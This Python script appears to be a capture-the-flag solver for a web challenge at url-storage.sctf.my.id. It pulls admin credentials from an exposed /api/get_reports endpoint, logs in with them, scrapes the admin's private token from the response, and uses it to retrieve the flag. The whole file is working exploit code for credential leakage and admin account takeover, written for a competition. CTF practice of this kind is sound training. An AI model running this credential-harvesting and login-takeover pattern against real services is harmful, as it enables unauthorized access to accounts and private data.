import os
import re
import requests

BASE = 'https://url-storage.sctf.my.id'
UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
CF_CLEARANCE = os.environ.get('CF_CLEARANCE', '')

if not CF_CLEARANCE:
    raise SystemExit('Usage: CF_CLEARANCE=<cookie> python3 solve_live.py')

s = requests.Session()
s.headers.update({'User-Agent': UA})
s.cookies.set('cf_clearance', CF_CLEARANCE, domain='.sctf.my.id', path='/')

creds = s.get(f'{BASE}/api/get_reports', timeout=30).json()
print('[+] Leaked creds:', creds)

resp = s.post(
    f'{BASE}/login',
    data={'username': creds['admin_username'], 'password': creds['admin_password']},
    allow_redirects=True,
    timeout=30,
)

match = re.search(r'private token: <code>([0-9a-f]{32})</code>', resp.text)
if not match:
    raise SystemExit('[-] Failed to extract admin token')

token = match.group(1)
print('[+] Admin token:', token)

flag_page = s.get(f'{BASE}/flag', params={'token': token}, timeout=30)
flag = re.search(r'(SCTF26\{[^<]+\})', flag_page.text)
if not flag:
    raise SystemExit('[-] Failed to extract flag')

print('[+] Flag:', flag.group(1))
